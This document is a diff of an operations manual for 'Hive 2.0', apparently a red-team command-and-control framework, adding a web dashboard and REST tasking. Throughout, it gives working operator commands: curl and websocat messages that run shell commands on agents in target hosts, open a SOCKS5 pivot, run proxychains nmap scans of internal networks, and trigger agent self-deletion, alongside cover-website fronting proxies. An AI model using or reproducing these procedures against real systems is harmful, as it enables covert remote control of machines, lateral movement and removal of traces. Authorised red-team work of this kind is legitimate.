@@ -1,8 +1,8 @@
 # Hive 2.0 — Operations Manual
 
-**Version:** 1.0  
-**Audience:** Red Team Operators, System Administrators  
-**Last Updated:** 2026-05-13
+**Version:** 1.1
+**Audience:** Red Team Operators, System Administrators
+**Last Updated:** 2026-05-14
 
 ---
 
@@ -14,6 +14,7 @@
    - 3.1 [Installing Go](#installing-go)
    - 3.2 [Cloning the Repository](#cloning-the-repository)
    - 3.3 [Building from Source](#building-from-source)
+   - 3.4 [Building the Web Dashboard](#building-the-web-dashboard)
 4. [Configuration Management](#configuration-management)
    - 4.1 [Generating Encryption Keys](#generating-encryption-keys)
    - 4.2 [Creating Plaintext Configs](#creating-plaintext-configs)
@@ -65,6 +66,7 @@ This manual describes the complete lifecycle of a Hive 2.0 operation: from build
 ## 2. Prerequisites
 
 - **Go 1.22** or later (for building from source).
+- **Node.js 18** and **npm** (to build the web dashboard).
 - **GNU Make** (optional, simplifies build).
 - **Ansible 2.14+** (for automated proxy deployment).
 - **SSH access** to the target VPS instances.
@@ -92,23 +94,38 @@ cd hive
 
 3.3 Building from Source
 
-Build both agent and server binaries:
+The project includes a React dashboard that must be built first. Ensure you have Node.js 18+ and npm installed.
+3.3.1 Build the web interface and then the binaries
 bash
 
 make build
 
-The output binaries will be placed in the bin/ directory:
+This runs build-web (installs npm dependencies and builds the React app into web/build), then compiles both hive-server and hive-agent.
 
-    bin/hive-server — the command centre.
+If you prefer manual steps:
+bash
 
-    bin/hive-agent — the agent.
+cd web
+npm install
+npm run build
+cd ..
+go build -o bin/hive-server ./cmd/hive
+go build -o bin/hive-agent ./cmd/hive
 
-For Windows agents:
+To build only the agent or server:
+bash
+
+make build-agent
+make build-server
+
+For Windows agent:
 bash
 
 make build-agent-win
-# Produces bin/hive-agent.exe
 
+3.4 Building the Web Dashboard
+
+The dashboard source is in web/. The build output goes to web/build/, which is embedded into the Go binary via //go:embed. The make build command automatically handles this step. If you ever modify the dashboard, rerun npm run build inside the web directory.
 4. Configuration Management
 
 All configuration files are JSON documents encrypted with AES‑256‑GCM. A 32‑byte key is required to encrypt or decrypt them.
@@ -117,7 +134,7 @@ All configuration files are JSON documents encrypted with AES‑256‑GCM. A 32�
 Generate a secure random key:
 bash
 
-openssl rand -base64 32
+export HIVE_CONFIG_KEY=$(openssl rand -base64 32)
 
 Output example: 3Zg8...= (44 characters, 32 bytes when decoded).
 
@@ -165,39 +182,18 @@ json
 The server configuration does not require a proxy list; it receives connections via the proxies.
 4.3 Encrypting Configs
 
-Use the supplied helper program or call config.SaveConfig directly. For simplicity, you can run a small Go tool (to be built from cmd/configtool), but the repository includes a simple script. Alternatively, you can write a temporary Go program:
+Use the built-in encryption command. The key must be in the HIVE_CONFIG_KEY environment variable.
 bash
 
-# Inside the project directory, you may use the existing config.SaveConfig logic
-# A dedicated tool is not yet provided, but you can write a simple main.go:
-cat > /tmp/encrypt.go << 'EOF'
-package main
+export HIVE_CONFIG_KEY="your-base64-key"
 
-import (
-    "os"
-    "github.com/blackswarm/hive/internal/config"
-    "github.com/blackswarm/hive/internal/crypto"
-)
+# Encrypt agent config
+./bin/hive-server -encrypt-in agent.json -encrypt-out agent_config.json
 
-func main() {
-    key := []byte(os.Getenv("HIVE_CONFIG_KEY"))
-    // Decode base64 if needed
-    // Load plain config from arg[1]
-    // Save encrypted to arg[2]
-}
-EOF
+# Encrypt server config
+./bin/hive-server -encrypt-in server.json -encrypt-out server_config.json
 
-Manual encryption (until a tool exists): Use the openssl command line:
-bash
-
-# Encrypt agent.json to agent_config.json
-openssl enc -aes-256-gcm -in agent.json -out agent_config.json \
-    -K $(echo -n "$HIVE_CONFIG_KEY" | base64 -d | xxd -p -c 32) \
-    -iv $(openssl rand -hex 12)   # GCM nonce (12 bytes)
-
-Note: The Go implementation expects the nonce prepended to the ciphertext, so manual encryption must match this format. It is recommended to use the in‑code tooling for compatibility.
-
-For production, a configtool binary will be provided. Until then, place the plain configs in a secure location and use the temporary Go program above, or encrypt programmatically.
+The encrypted files (agent_config.json, server_config.json) are binary and can be used with the -config flag. The original plaintext files should be securely deleted.
 5. Fronting Proxy Deployment
 
 Each fronting proxy is an Nginx server that serves a static cover website and proxies WebSocket connections to the backend hive.
@@ -321,9 +317,13 @@ openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
 
 6.3 Accessing the Dashboard
 
-Open a browser and go to https://<hive-address>:8443. The embedded React dashboard loads automatically. It displays a list of online agents and allows you to send commands.
+Open a browser and go to https://<hive-address>:8443. The embedded React dashboard loads automatically. It displays a list of online agents and allows you to send commands. The dashboard communicates with the server via REST endpoints:
 
-Note: The dashboard currently calls /api/agents and /api/tasks endpoints that are not yet implemented in the server code provided. The operator must use the WebSocket protocol directly for tasking; a future update will wire the dashboard to the agent manager.
+    GET /api/agents — list of connected agents
+
+    POST /api/tasks — send a command to an agent
+
+The interface shows the agent inventory, an input for commands, and a result list. As agents come online, they appear in the list automatically (polled every 5 seconds). You can type a command, click "Send" next to an agent, and the result will appear in the results area.
 6.4 Server Logging
 
 The server logs JSON‑structured logs to stdout. You can redirect them to a file:
@@ -373,48 +373,57 @@ cmd
 set HIVE_CONFIG_KEY=...
 hive-agent.exe -mode=agent -config=agent_config.json
 
-The Windows agent has the same functionality, including self‑destruct (delayed deletion on reboot).
+The Windows agent has the same functionality, including self‑destruct (delayed deletion on reboot) and command execution (using cmd /c).
 8. Operational Tasks
 8.1 Listing Agents
 
-Via the dashboard (when fully integrated) or programmatically using the server’s API (not yet implemented). Currently, the operator must monitor server logs to see which agents are connected.
+Via the dashboard: the list of agents appears automatically. You can also query the REST API directly:
+bash
+
+curl https://<hive-address>/api/agents
+
+Response is a JSON array of agent objects with fields id, hostname, os, ip, last_seen, status.
 8.2 Sending Commands
 
-Send a JSON message over the WebSocket of the desired agent. This requires a client that can inject messages into the agent’s connection. The server handler supports a SendTask function, which can be called from an operator CLI or integrated dashboard.
+Via dashboard: type a command in the input field, then click "Send" next to the desired agent. The result will appear in the results list when it arrives.
 
-Temporary manual method: use websocat or a custom script to connect to the hive’s WebSocket and send a TaskMsg:
-json
+Via API:
+bash
 
-{
-  "type": "task",
-  "payload": {
-    "task_id": "001",
-    "command": "whoami",
-    "timeout": 30
-  }
-}
+curl -X POST https://<hive-address>/api/tasks \
+  -H "Content-Type: application/json" \
+  -d '{"agent_id":"bee-01","command":"whoami"}'
 
-The agent will reply with a ResultMsg.
+The server returns a JSON object {"task_id":"..."}. You can use this ID to correlate with results.
 8.3 Viewing Results
 
-Results are logged by the server and also available via the ResultMsg payload. The operator can collect them from the server logs or the dashboard.
+Results are shown in the dashboard and also logged by the server. They are not persisted; once an agent disconnects, old results are lost (future improvement).
 8.4 Enabling the SOCKS5 Proxy
 
-Send a proxy_on message to the agent. The agent will start a SOCKS5 proxy on port 1080 (default). You can then configure your tools (e.g., browser, proxychains) to use socks5://<agent-ip>:1080.
+Send a proxy_on message to the agent over the WebSocket (not yet exposed via dashboard). You can use a tool like websocat:
+bash
 
-To stop the proxy, send proxy_off.
+echo '{"type":"proxy_on"}' | websocat wss://<proxy>/ws
+
+The agent will start a SOCKS5 proxy on port 1080. You can then configure your tools to use socks5://<agent-ip>:1080.
+
+To stop the proxy, send {"type":"proxy_off"}.
 8.5 Agent Self‑Destruct
 
-Send a destroy message. The agent will:
+Send a destroy message (via WebSocket). The agent will:
 
-    On Linux: delete its own binary and call os.Exit(0).
+    On Linux: delete its own binary and exit.
 
-    On Windows: use MoveFileEx with MOVEFILE_DELAY_UNTIL_REBOOT to schedule deletion on next reboot, then exit.
+    On Windows: schedule deletion on next reboot and exit.
 
-This action is irreversible.
+Example:
+bash
+
+echo '{"type":"destroy"}' | websocat wss://<proxy>/ws
+
 8.6 Generating an Operation Report
 
-The reporting.go module can produce a Markdown report. Call the GenerateReport function with the agent manager, a list of dispatched tasks, and a list of results. This is typically done by the server after the operation concludes. The output can be piped to a .md file and converted to PDF.
+The reporting.go module can produce a Markdown report. This is not yet wired into the server API, but you can call GenerateReport from a custom script or command‑line tool. The function takes an AgentManager, a list of tasks, and a list of results, and returns a Markdown string. You can pipe it to a .md file and convert to PDF with pandoc.
 9. Security Procedures
 9.1 Key Hygiene
 
@@ -485,46 +494,51 @@ Setup:
 
     Agent: bee-01 on a target Windows host
 
-1. Start the hive server:
+1. Generate key and encrypt configs:
+bash
+
+export HIVE_CONFIG_KEY=$(openssl rand -base64 32)
+./bin/hive-server -encrypt-in agent.json -encrypt-out agent_config.json
+./bin/hive-server -encrypt-in server.json -encrypt-out server_config.json
+
+2. Start the hive server:
 bash
 
 ./bin/hive-server -mode=server -config=server_config.json
 
-2. Start the agent on target (via proxy):
+3. Start the agent on target (via proxy):
 cmd
 
 set HIVE_CONFIG_KEY=...
 hive-agent.exe -mode=agent -config=agent_config.json
 
-3. Agent registers; hive log shows:
+4. Agent registers; hive log shows:
 text
 
 INFO agent registered id=bee-01 hostname=WIN-TARGET
 
-4. Send a task (using websocat from operator machine):
+5. Send a task via dashboard or curl:
 bash
 
-echo '{"type":"task","payload":{"task_id":"1","command":"ipconfig","timeout":10}}' | \
-  websocat wss://proxy1.ops.net/ws
+curl -X POST https://proxy1.ops.net/api/tasks \
+  -H "Content-Type: application/json" \
+  -d '{"agent_id":"bee-01","command":"ipconfig"}'
 
-5. Result appears in hive log:
-text
+6. Result appears in dashboard and server log.
 
-INFO task result received task_id=1 agent=bee-01 stdout=Windows IP Configuration...
+7. Enable SOCKS5 proxy (using websocat):
+bash
 
-6. Enable SOCKS5 proxy on agent:
-Send {"type":"proxy_on"}. The agent starts a SOCKS5 proxy on port 1080.
+echo '{"type":"proxy_on"}' | websocat wss://proxy1.ops.net/ws
 
-7. Pivot through agent:
+8. Pivot through agent:
 bash
 
 proxychains nmap -sT -Pn 10.0.0.0/24
 
-8. Generate report:
-Call GenerateReport and save to report.md.
+9. Generate report: call GenerateReport and save to report.md.
 
-9. Clean up:
-Send {"type":"destroy"} to the agent. Then destroy the proxy VPS.
+10. Clean up: send destroy to the agent. Then destroy the proxy VPS.
 12. Glossary
 Term	Meaning
 Hive	Command centre server managing one or more agents.
